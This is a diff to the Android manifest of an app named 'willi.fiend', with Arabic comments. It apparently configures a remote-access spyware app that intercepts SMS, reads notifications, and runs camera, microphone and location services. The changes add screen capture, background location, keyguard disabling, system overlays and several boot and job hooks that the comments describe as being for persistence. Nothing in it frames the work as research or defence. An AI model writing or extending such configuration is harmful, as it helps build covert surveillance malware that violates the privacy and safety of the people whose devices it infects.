@@ -1,8 +1,10 @@
+<!-- AndroidManifest.xml (معدل) -->
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
     package="willi.fiend">
 
+    <!-- الصلاحيات الأساسية -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -17,6 +19,17 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.VIBRATE" />
+    
+    <!-- صلاحيات إضافية للثبات والتشغيل في الخلفية -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    
+    <!-- صلاحيات خاصة للتشغيل التلقائي على أجهزة معينة -->
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
 
     <application
         android:allowBackup="true"
@@ -28,6 +41,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.Fiend"
         tools:targetApi="31">
+        
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -35,11 +49,11 @@
             android:theme="@style/Theme.Fiend">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <!-- مستقبل الرسائل القصيرة -->
         <receiver
             android:name=".Receiver.SmsReceiver"
             android:exported="true">
@@ -47,14 +61,19 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
+        
+        <!-- مستقبل بدء التشغيل (التشغيل التلقائي) -->
         <receiver
             android:name=".Receiver.BootCompleteReceiver"
+            android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
+        <!-- خدمة الاستماع للإشعارات -->
         <service
             android:name=".Utils.AppNotificationListener"
             android:exported="true"
@@ -64,11 +83,21 @@
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
+        
+        <!-- الخدمة الرئيسية (خدمة المقدمة) -->
         <service
             android:name=".MainService"
             android:enabled="true"
             android:exported="true"
-            android:foregroundServiceType="camera|microphone|location" />
+            android:foregroundServiceType="camera|microphone|location|mediaProjection" />
+            
+        <!-- خدمة إضافية للثبات -->
+        <service
+            android:name=".JobWakeUpService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
     </application>
 
 </manifest>
